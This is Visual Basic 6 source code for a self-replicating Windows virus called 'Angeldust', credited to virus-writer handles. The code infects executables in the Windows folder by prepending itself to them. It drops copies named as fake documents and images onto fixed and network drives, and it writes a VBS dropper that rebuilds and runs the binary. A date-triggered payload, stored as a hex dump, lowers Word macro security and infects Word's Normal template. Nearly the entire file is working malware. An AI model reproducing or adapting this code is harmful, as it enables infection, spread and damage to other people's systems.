   VERSION 5.00
   Begin VB.Form Form1
      Caption         =   "Form1"
      ClientHeight    =   3195
      ClientLeft      =   60
      ClientTop       =   345
      ClientWidth     =   4680
      LinkTopic       =   "Form1"
      ScaleHeight     =   3195
      ScaleWidth      =   4680
      StartUpPosition =   3  'Windows-Standard
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
   Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
   Const CSIDL_WIN = &H24
   Private Type SHITEMID
       cb As Long
       abID As Byte
   End Type
   Private Type ITEMIDLIST
       mkid As SHITEMID
   End Type

   Sub main()
   On Error Resume Next
   Dim phile1, phile2
   Dim Source, target, tmp_name, file_data, file_data_1, X As String
    Source = "c:\babe.exe"
    target = "c:\cichosz.vbs"
    tmp_name = "c:\angeldust.exe"
    nuOne = Environ("WINDIR") & "\necronomikon.tmp"
    phile1 = App.path & "\" & App.EXEName & ".EXE"
   phile2 = App.path & App.EXEName & ".EXE"
   FileCopy phile1, Source
   FileCopy phile2, Source
   FileCopy Source, nuOne
   If Month(Now) = 12 And Day(Now) = 14 Then Call payload

    Open target For Output As #2
     'thx ApOx for help
   Print #2, "'angeldust"
   Print #2, "'(c)by Necronomikon/DCA/Zer0Gravity"
   Print #2, "Set dr = fso.Drives"
   Print #2, "For Each d In dr"
   Print #2, "If d.DriveType = 2 Or d.DriveType = 3 Then"
   Print #2, "list(d.path&""\"")"
   Print #2, "End If"
   Print #2, "Next"
   Print #2, "End Sub"
   Print #2, "Sub infect(nec)"
   Print #2, "Set f = fso.GetFolder(nec)"
   Print #2, "Set fc = f.Files"
   Print #2, "For Each f1 In fc"
   Print #2, "ext = fso.GetExtensionName(f1.Path)"
   Print #2, "ext = LCase(ext)"
   Print #2, "If (ext = ""vbs"") Then"
   Print #2, "Set bla = fso.OpenTextFile(f1.Path, 1, False)"
   Print #2, "If bla.ReadLine <> ""'angeldust"" Then"
   Print #2, "bla.Close"
   Print #2, "Set bla = fso.OpenTextFile(f1.Path, 1, False)"
   Print #2, "vbsorg = bla.ReadAll()"
   Print #2, "bla.Close"
   Print #2, "End If"
   Print #2, "End If"
   Print #2, "Next"
   Print #2, "End Sub"
   Print #2, "Sub list(nec)"
   Print #2, "Set f = fso.GetFolder(nec)"
   Print #2, "Set sf = f.SubFolders"
   Print #2, "For Each f1 In sf"
   Print #2, "infect (f1.Path)"
   Print #2, "list (f1.Path)"
   Print #2, "Next"
   Print #2, "End Sub"
    Print #2, "dim filesys, filetxt, getname, path, textfile, i"
    Print #2, "textfile = " & Chr(34) & tmp_name & Chr(34)
    Print #2, "Set filesys = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
    Print #2, "Set filetxt = filesys.CreateTextFile(textfile, True)"
    Print #2, "getname = filesys.GetFileName(path)"
    Open Source For Binary As #1
     file_len = (LOF(1))
     file_data = Space(file_len)
     Get #1, , file_data
    Close #1
     Dim b(1 To 10) As String
     X = 0
     Y = 1
     b(1) = ""
     b(2) = ""
     b(3) = ""
     b(4) = ""
     b(5) = ""
     b(6) = ""
     b(7) = ""
     b(8) = ""
     b(9) = ""
     b(10) = ""
    For i = 1 To file_len
    If X = 0 Then Y = 1
    If X = 10 Then Y = 2
    If X = 20 Then Y = 3
    If X = 30 Then Y = 4
    If X = 40 Then Y = 5
    If X = 50 Then Y = 6
    If X = 60 Then Y = 7
    If X = 70 Then Y = 8
    If X = 80 Then Y = 9
    If X = 90 Then Y = 10
    If X <> Int((i / file_len) * 100) And Int((i / file_len) * 100) <= 100 Then
     X = Int((i / file_len) * 100)
     End If
     If i < file_len Then b(Y) = b(Y) & "chr(" & Asc(Mid$(file_data, i, 1)) & ")" & "&" Else b(Y) = b(Y) & "chr(" & Asc(Mid$(file_data, i, 1)) & ")"
    Next i

    c = b(1) & b(2) & b(3) & b(4) & b(5) & b(6) & b(7) & b(8) & b(9) & b(10)
    Print #2, "filetxt.Write(" & c & ")"
    Print #2, "filetxt.Close"
    Print #2, "dim strt"
    Print #2, "dim mine"
    Print #2, "Const ForReading = 1, ForWriting = 2, ForAppending = 3"
    Print #2, "const RemoteExe = " & Chr(34) & tmp_name & Chr(34)
    Print #2, "set mine = wscript.createobject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
    Print #2, "strt = mine.run (" & Chr(34) & tmp_name & Chr(34) & ")"
    Print #2, "kill ""c:\babe.exe"""
    Print #2, "wscript.quit"
    Close #2
    Call mygame
   End Sub
   Sub mygame()
   'taken from brigada worm a by alcopaul & PetiK
   On Error Resume Next
   Dim vdir As String
   Dim sfile As String
   Dim a As String
   Dim arr1
   Dim lenhost As String
   Dim vc As String
   Dim mark As String
   Dim host
   vdir = App.path
   If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
   sfile = Dir$(GetSpecialfolder(CSIDL_WIN) & "\*.exe")
   While sfile <> ""
   a = a & sfile & "/"
   sfile = Dir$
   Wend
   arr1 = Split(a, "/")
   For Each host In arr1
   Open GetSpecialfolder(CSIDL_WIN) & "\" & host For Binary Access Read As #1
   lenhost = (LOF(1))
   vc = Space(lenhost)
   Get #1, , vc
   Close #1
   mark = Right(vc, 2)
   If mark <> "dca" Then
   GoTo notinfected
   Else
   GoTo gggoop
   End If
   notinfected:
   infect (GetSpecialfolder(CSIDL_WIN) & "\" & host)
   Exit For
   Call nt
   gggoop:
   Next host
   End Sub
   Function startgame(hostpath As String)
   On Error Resume Next
   Dim ffile
   Dim hostcode As String
   Dim vir As String
   Dim vircode As String
   Dim header As String
   Dim f As String
   vir = App.path
   If Right(vir, 1) <> "\" Then vir = vir & "\"
   Open hostpath For Binary Access Read As #1
   hostcode = Space(LOF(1))
   Get #1, , hostcode
   Close #1
   Open vir & App.EXEName & ".exe" For Binary Access Read As #2
   header = Space(LOF(2))
   Get #2, , header
   Close #2
   f = "dca"
   Open hostpath For Binary Access Write As #3
   Put #3, , header
   Put #3, , hostcode
   Put #3, , f
   Close #3
   End Function
   Private Function GetSpecialfolder(CSIDL As Long) As String
       Dim r As Long
       Dim IDL As ITEMIDLIST
       Dim path As String
       r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
       If r = 0 Then
           path$ = Space$(512)
           r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)
           GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)
           Exit Function
       End If
       GetSpecialfolder = ""
   End Function
   Sub infect(drive)
   On Error Resume Next
   Dim s, f
   Set s = CreateObject("Scripting.FileSystemObject")
   Set f = s.GetFile("Environ(""WINDIR"") & ""\necronomikon.tmp""")
   f.Copy (drive & "\readme.txt.exe")
   f.Copy (drive & "\TittyTwister.avi.exe")
   f.Copy (drive & "\sexy.jpg.exe")
   End Sub
   Function ShowDriveType(drvpath)
   On Error Resume Next
   Dim fso, d, t
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set d = fso.GetDrive(drvpath)
   Select Case d.DriveType
   Case 0: t = "Unknown"
   Case 1: t = "Removable"
   Case 2: t = "Fixed"
   Case 3: t = "Network"
   Case 4: t = "CD-ROM"
   Case 5: t = "RAM Disk"
   End Select
   If t = "" Then t = "None"
   ShowDriveType = t
   End Function
   Sub nt()
   On Error Resume Next
   Dim n, l, d3, drv
   For n = 65 To 90
   l = Chr(n)
   drv = l & ":"
   d3 = ShowDriveType(drv)
   If d3 = "Fixed" Then infect (drv)
   If d3 = "Network" Then infect (drv)
   Next n
   End Sub


   Private Sub payload()
   On Error Resume Next
   Open "c:\temp.txt" For Output As #1
   Print #1, "e 0100  4F 6E 20 45 72 72 6F 72 20 52 65 73 75 6D 65 20"
   Print #1, "e 0110  4E 65 78 74 0D 0A 27 56 42 53 2F 57 69 6E 33 32"
   Print #1, "e 0120  2E 41 4E 67 65 6C 64 75 73 74 0D 0A 27 28 63 29"
   Print #1, "e 0130  62 79 20 4E 65 63 72 6F 6E 6F 6D 69 6B 6F 6E 2F"
   Print #1, "e 0140  44 43 41 0D 0A 53 65 74 20 66 73 6F 20 3D 20 43"
   Print #1, "e 0150  72 65 61 74 65 4F 62 6A 65 63 74 28 22 53 63 72"
   Print #1, "e 0160  69 70 74 69 6E 67 2E 46 69 6C 65 53 79 73 74 65"
   Print #1, "e 0170  6D 4F 62 6A 65 63 74 22 29 0D 0A 53 65 74 20 57"
   Print #1, "e 0180  69 6E 44 69 72 20 3D 20 66 73 6F 2E 47 65 74 53"
   Print #1, "e 0190  70 65 63 69 61 6C 46 6F 6C 64 65 72 28 30 29 0D"
   Print #1, "e 01A0  0A 53 65 74 20 57 53 48 53 68 65 6C 6C 20 3D 20"
   Print #1, "e 01B0  57 53 63 72 69 70 74 2E 43 72 65 61 74 65 4F 62"
   Print #1, "e 01C0  6A 65 63 74 28 22 57 53 63 72 69 70 74 2E 53 68"
   Print #1, "e 01D0  65 6C 6C 22 29 0D 0A 57 53 48 53 68 65 6C 6C 2E"
   Print #1, "e 01E0  52 65 67 57 72 69 74 65 20 22 48 4B 45 59 5F 43"
   Print #1, "e 01F0  55 52 52 45 4E 54 5F 55 53 45 52 5C 53 6F 66 74"
   Print #1, "e 0200  77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 4F"
   Print #1, "e 0210  66 66 69 63 65 5C 31 30 2E 30 5C 57 6F 72 64 5C"
   Print #1, "e 0220  53 65 63 75 72 69 74 79 5C 41 63 63 65 73 73 56"
   Print #1, "e 0230  42 4F 4D 22 2C 20 31 2C 20 22 52 45 47 5F 44 57"
   Print #1, "e 0240  4F 52 44 22 0D 0A 57 53 48 53 68 65 6C 6C 2E 52"
   Print #1, "e 0250  65 67 57 72 69 74 65 20 22 48 4B 45 59 5F 43 55"
   Print #1, "e 0260  52 52 45 4E 54 5F 55 53 45 52 5C 53 6F 66 74 77"
   Print #1, "e 0270  61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 4F 66"
   Print #1, "e 0280  66 69 63 65 5C 31 30 2E 30 5C 57 6F 72 64 5C 53"
   Print #1, "e 0290  65 63 75 72 69 74 79 5C 4C 65 76 65 6C 22 2C 20"
   Print #1, "e 02A0  31 2C 20 22 52 45 47 5F 44 57 4F 52 44 22 0D 0A"
   Print #1, "e 02B0  57 53 48 53 68 65 6C 6C 2E 52 65 67 57 72 69 74"
   Print #1, "e 02C0  65 20 22 48 4B 45 59 5F 43 55 52 52 45 4E 54 5F"
   Print #1, "e 02D0  55 53 45 52 5C 53 6F 66 74 77 61 72 65 5C 4D 69"
   Print #1, "e 02E0  63 72 6F 73 6F 66 74 5C 4F 66 66 69 63 65 5C 39"
   Print #1, "e 02F0  2E 30 5C 57 6F 72 64 5C 53 65 63 75 72 69 74 79"
   Print #1, "e 0300  5C 4C 65 76 65 6C 22 2C 20 31 2C 20 22 52 45 47"
   Print #1, "e 0310  5F 44 57 4F 52 44 22 0D 0A 53 65 74 20 42 61 63"
   Print #1, "e 0320  6B 75 70 20 3D 20 57 53 63 72 69 70 74 2E 43 72"
   Print #1, "e 0330  65 61 74 65 4F 62 6A 65 63 74 28 22 57 6F 72 64"
   Print #1, "e 0340  2E 41 70 70 6C 69 63 61 74 69 6F 6E 22 29 0D 0A"
   Print #1, "e 0350  42 61 63 6B 75 70 2E 4F 70 74 69 6F 6E 73 2E 56"
   Print #1, "e 0360  69 72 75 73 50 72 6F 74 65 63 74 69 6F 6E 20 3D"
   Print #1, "e 0370  20 28 52 6E 64 20 2A 20 30 29 0D 0A 42 61 63 6B"
   Print #1, "e 0380  75 70 2E 4F 70 74 69 6F 6E 73 2E 53 61 76 65 4E"
   Print #1, "e 0390  6F 72 6D 61 6C 50 72 6F 6D 70 74 20 3D 20 28 52"
   Print #1, "e 03A0  6E 64 20 2A 20 30 29 0D 0A 53 65 74 20 62 61 62"
   Print #1, "e 03B0  65 20 3D 20 66 73 6F 2E 4F 70 65 6E 54 65 78 74"
   Print #1, "e 03C0  46 69 6C 65 28 57 53 63 72 69 70 74 2E 53 63 72"
   Print #1, "e 03D0  69 70 74 46 75 6C 6C 4E 61 6D 65 2C 20 31 29 0D"
   Print #1, "e 03E0  0A 53 63 72 69 70 74 52 65 61 64 31 36 20 3D 20"
   Print #1, "e 03F0  62 61 62 65 2E 52 65 61 64 41 6C 6C 0D 0A 62 61"
   Print #1, "e 0400  62 65 2E 43 6C 6F 73 65 0D 0A 0D 0A 53 65 74 20"
   Print #1, "e 0410  44 72 6F 70 46 69 6C 65 20 3D 20 46 53 4F 2E 43"
   Print #1, "e 0420  72 65 61 74 65 54 65 78 74 46 69 6C 65 28 22 63"
   Print #1, "e 0430  3A 5C 61 6E 67 65 6C 64 75 73 74 2E 64 61 74 22"
   Print #1, "e 0440  2C 20 54 72 75 65 29 0D 0A 44 72 6F 70 46 69 6C"
   Print #1, "e 0450  65 2E 57 72 69 74 65 4C 69 6E 65 20 22 50 75 62"
   Print #1, "e 0460  6C 69 63 20 44 65 63 6C 61 72 65 20 46 75 6E 63"
   Print #1, "e 0470  74 69 6F 6E 20 47 65 74 44 43 20 4C 69 62 20 22"
   Print #1, "e 0480  22 75 73 65 72 33 32 22 22 20 28 42 79 56 61 6C"
   Print #1, "e 0490  20 68 77 6E 64 20 41 73 20 4C 6F 6E 67 29 20 41"
   Print #1, "e 04A0  73 20 4C 6F 6E 67 22 0D 0A 44 72 6F 70 46 69 6C"
   Print #1, "e 04B0  65 2E 57 72 69 74 65 4C 69 6E 65 20 22 50 75 62"
   Print #1, "e 04C0  6C 69 63 20 44 65 63 6C 61 72 65 20 46 75 6E 63"
   Print #1, "e 04D0  74 69 6F 6E 20 42 69 74 42 6C 74 20 4C 69 62 20"
   Print #1, "e 04E0  22 22 67 64 69 33 32 22 22 20 28 42 79 56 61 6C"
   Print #1, "e 04F0  20 68 44 65 73 74 44 43 20 41 73 20 4C 6F 6E 67"
   Print #1, "e 0500  2C 20 42 79 56 61 6C 20 78 20 41 73 20 4C 6F 6E"
   Print #1, "e 0510  67 2C 20 42 79 56 61 6C 20 59 20 41 73 20 4C 6F"
   Print #1, "e 0520  6E 67 2C 20 42 79 56 61 6C 20 6E 57 69 64 74 68"
   Print #1, "e 0530  20 41 73 20 4C 6F 6E 67 2C 20 42 79 56 61 6C 20"
   Print #1, "e 0540  6E 48 65 69 67 68 74 20 41 73 20 4C 6F 6E 67 2C"
   Print #1, "e 0550  20 42 79 56 61 6C 20 68 53 72 63 44 43 20 41 73"
   Print #1, "e 0560  20 4C 6F 6E 67 2C 20 42 79 56 61 6C 20 58 53 72"
   Print #1, "e 0570  63 20 41 73 20 4C 6F 6E 67 2C 20 42 79 56 61 6C"
   Print #1, "e 0580  20 59 53 72 63 20 41 73 20 4C 6F 6E 67 2C 20 42"
   Print #1, "e 0590  79 56 61 6C 20 64 77 52 6F 70 20 41 73 20 4C 6F"
   Print #1, "e 05A0  6E 67 29 20 41 73 20 4C 6F 6E 67 22 0D 0A 44 72"
   Print #1, "e 05B0  6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65"
   Print #1, "e 05C0  20 22 53 75 62 20 41 75 74 6F 4F 70 65 6E 28 29"
   Print #1, "e 05D0  22 0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74"
   Print #1, "e 05E0  65 4C 69 6E 65 20 22 4F 6E 20 45 72 72 6F 72 20"
   Print #1, "e 05F0  52 65 73 75 6D 65 20 4E 65 78 74 22 0D 0A 44 72"
   Print #1, "e 0600  6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65"
   Print #1, "e 0610  20 22 53 79 73 74 65 6D 2E 50 72 69 76 61 74 65"
   Print #1, "e 0620  50 72 6F 66 69 6C 65 53 74 72 69 6E 67 28 22 22"
   Print #1, "e 0630  22 22 2C 20 22 22 48 4B 45 59 5F 43 55 52 52 45"
   Print #1, "e 0640  4E 54 5F 55 53 45 52 5C 53 6F 66 74 77 61 72 65"
   Print #1, "e 0650  5C 41 6E 67 65 6C 64 75 73 74 22 22 2C 20 22 22"
   Print #1, "e 0660  41 6E 67 65 6C 64 75 73 74 22 22 29 20 3D 20 22"
   Print #1, "e 0670  22 62 79 20 4E 65 63 72 6F 6E 6F 6D 69 6B 6F 6E"
   Print #1, "e 0680  5B 44 43 41 5D 22 22 22 0D 0A 44 72 6F 70 46 69"
   Print #1, "e 0690  6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 41 70"
   Print #1, "e 06A0  70 6C 69 63 61 74 69 6F 6E 2E 57 69 6E 64 6F 77"
   Print #1, "e 06B0  53 74 61 74 65 20 3D 20 77 64 57 69 6E 64 6F 77"
   Print #1, "e 06C0  53 74 61 74 65 4D 69 6E 69 6D 69 7A 65 22 0D 0A"
   Print #1, "e 06D0  44 72 6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69"
   Print #1, "e 06E0  6E 65 20 22 52 61 6E 64 6F 6D 69 7A 65 22 0D 0A"
   Print #1, "e 06F0  44 72 6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69"
   Print #1, "e 0700  6E 65 20 22 46 6F 72 20 67 72 61 66 20 3D 20 31"
   Print #1, "e 0710  20 54 6F 20 32 32 30 30 22 0D 0A 44 72 6F 70 46"
   Print #1, "e 0720  69 6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 52"
   Print #1, "e 0730  61 6E 64 6F 6D 69 7A 65 22 0D 0A 44 72 6F 70 46"
   Print #1, "e 0740  69 6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 63"
   Print #1, "e 0750  20 3D 20 47 65 74 44 43 28 30 29 22 0D 0A 44 72"
   Print #1, "e 0760  6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65"
   Print #1, "e 0770  20 22 78 20 3D 20 49 6E 74 28 52 6E 64 20 2A 20"
   Print #1, "e 0780  36 30 30 29 20 2B 20 31 22 0D 0A 44 72 6F 70 46"
   Print #1, "e 0790  69 6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 59"
   Print #1, "e 07A0  20 3D 20 49 6E 74 28 52 6E 64 20 2A 20 38 30 30"
   Print #1, "e 07B0  29 20 2B 20 31 22 0D 0A 44 72 6F 70 46 69 6C 65"
   Print #1, "e 07C0  2E 57 72 69 74 65 4C 69 6E 65 20 22 58 31 20 3D"
   Print #1, "e 07D0  20 78 20 2B 20 31 22 0D 0A 44 72 6F 70 46 69 6C"
   Print #1, "e 07E0  65 2E 57 72 69 74 65 4C 69 6E 65 20 22 59 31 20"
   Print #1, "e 07F0  3D 20 59 20 2B 20 31 22 0D 0A 44 72 6F 70 46 69"
   Print #1, "e 0800  6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 63 20"
   Print #1, "e 0810  3D 20 42 69 74 42 6C 74 28 63 2C 20 59 31 2C 20"
   Print #1, "e 0820  58 31 2C 20 32 30 2C 20 32 30 2C 20 63 2C 20 59"
   Print #1, "e 0830  2C 20 78 2C 20 2D 33 29 22 0D 0A 44 72 6F 70 46"
   Print #1, "e 0840  69 6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 4E"
   Print #1, "e 0850  65 78 74 20 67 72 61 66 22 0D 0A 44 72 6F 70 46"
   Print #1, "e 0860  69 6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 4D"
   Print #1, "e 0870  73 67 42 6F 78 20 22 22 46 65 65 6C 20 74 68 65"
   Print #1, "e 0880  20 77 68 69 74 65 20 70 6F 77 65 72 2E 2E 2E 22"
   Print #1, "e 0890  22 2C 20 76 62 43 72 69 74 69 63 61 6C 2C 20 22"
   Print #1, "e 08A0  22 56 42 53 2F 57 69 6E 33 32 2E 41 6E 67 65 6C"
   Print #1, "e 08B0  64 75 73 74 22 22 22 0D 0A 44 72 6F 70 46 69 6C"
   Print #1, "e 08C0  65 2E 57 72 69 74 65 4C 69 6E 65 20 22 53 79 73"
   Print #1, "e 08D0  74 65 6D 2E 50 72 69 76 61 74 65 50 72 6F 66 69"
   Print #1, "e 08E0  6C 65 53 74 72 69 6E 67 28 22 22 22 22 2C 20 22"
   Print #1, "e 08F0  22 48 4B 45 59 5F 43 55 52 52 45 4E 54 5F 55 53"
   Print #1, "e 0900  45 52 5C 43 6F 6E 74 72 6F 6C 20 50 61 6E 65 6C"
   Print #1, "e 0910  5C 43 6F 6C 6F 72 73 5C 22 22 2C 20 22 22 42 61"
   Print #1, "e 0920  63 6B 67 72 6F 75 6E 64 22 22 29 20 3D 20 22 22"
   Print #1, "e 0930  32 35 35 20 32 35 35 20 32 35 35 22 22 22 0D 0A"
   Print #1, "e 0940  44 72 6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69"
   Print #1, "e 0950  6E 65 20 22 41 70 70 6C 69 63 61 74 69 6F 6E 2E"
   Print #1, "e 0960  57 69 6E 64 6F 77 53 74 61 74 65 20 3D 20 77 64"
   Print #1, "e 0970  57 69 6E 64 6F 77 53 74 61 74 65 4E 6F 72 6D 61"
   Print #1, "e 0980  6C 22 0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72 69"
   Print #1, "e 0990  74 65 4C 69 6E 65 20 22 45 6E 64 20 53 75 62 22"
   Print #1, "e 09A0  0D 0A 44 72 6F 70 46 69 6C 65 2E 43 6C 6F 73 65"
   Print #1, "e 09B0  0D 0A 0D 0A 42 61 63 6B 75 70 2E 56 69 73 69 62"
   Print #1, "e 09C0  6C 65 20 3D 20 46 61 6C 73 65 0D 0A 53 65 74 20"
   Print #1, "e 09D0  6E 74 20 3D 20 42 61 63 6B 75 70 2E 4E 6F 72 6D"
   Print #1, "e 09E0  61 6C 54 65 6D 70 6C 61 74 65 2E 76 62 70 72 6F"
   Print #1, "e 09F0  6A 65 63 74 2E 76 62 63 6F 6D 70 6F 6E 65 6E 74"
   Print #1, "e 0A00  73 28 31 29 2E 63 6F 64 65 6D 6F 64 75 6C 65 0D"
   Print #1, "e 0A10  0A 53 65 74 20 69 77 20 3D 20 66 73 6F 2E 4F 70"
   Print #1, "e 0A20  65 6E 54 65 78 74 46 69 6C 65 28 22 63 3A 5C 61"
   Print #1, "e 0A30  6E 67 65 6C 64 75 73 74 2E 64 61 74 22 2C 20 31"
   Print #1, "e 0A40  2C 20 54 72 75 65 29 0D 0A 6E 74 2E 44 65 6C 65"
   Print #1, "e 0A50  74 65 4C 69 6E 65 73 20 31 2C 20 6E 74 2E 43 6F"
   Print #1, "e 0A60  75 6E 74 4F 66 4C 69 6E 65 73 0D 0A 69 20 3D 20"
   Print #1, "e 0A70  31 0D 0A 44 6F 20 57 68 69 6C 65 20 69 77 2E 61"
   Print #1, "e 0A80  74 65 6E 64 6F 66 73 74 72 65 61 6D 20 3C 3E 20"
   Print #1, "e 0A90  54 72 75 65 0D 0A 62 20 3D 20 69 77 2E 72 65 61"
   Print #1, "e 0AA0  64 6C 69 6E 65 0D 0A 6E 74 2E 49 6E 73 65 72 74"
   Print #1, "e 0AB0  4C 69 6E 65 73 20 69 2C 20 62 0D 0A 69 20 3D 20"
   Print #1, "e 0AC0  69 20 2B 20 31 0D 0A 4C 6F 6F 70 0D 0A 42 61 63"
   Print #1, "e 0AD0  6B 75 70 2E 4E 6F 72 6D 61 6C 54 65 6D 70 6C 61"
   Print #1, "e 0AE0  74 65 2E 53 61 76 65 0D 0A 53 65 74 41 74 74 72"
   Print #1, "e 0AF0  20 6F 77 6F 72 64 2E 4E 6F 72 6D 61 6C 54 65 6D"
   Print #1, "e 0B00  70 6C 61 74 65 2E 46 75 6C 6C 6E 61 6D 65 2C 20"
   Print #1, "e 0B10  76 62 52 65 61 64 4F 6E 6C 79 0D 0A 42 61 63 6B"
   Print #1, "e 0B20  75 70 2E 4E 6F 72 6D 61 6C 54 65 6D 70 6C 61 74"
   Print #1, "e 0B30  65 2E 43 6C 6F 73 65 0D 0A 66 73 6F 2E 44 65 6C"
   Print #1, "e 0B40  65 74 65 46 69 6C 65 20 77 73 63 72 69 70 74 2E"
   Print #1, "e 0B50  53 63 72 69 70 74 46 75 6C 6C 4E 61 6D 65 00"
   Print #1, "rcx"
   Print #1, "A5E"
   Print #1, "nC:\payload.vbs"
   Print #1, "w"
   Print #1, "q"
   Close #1
   End Sub
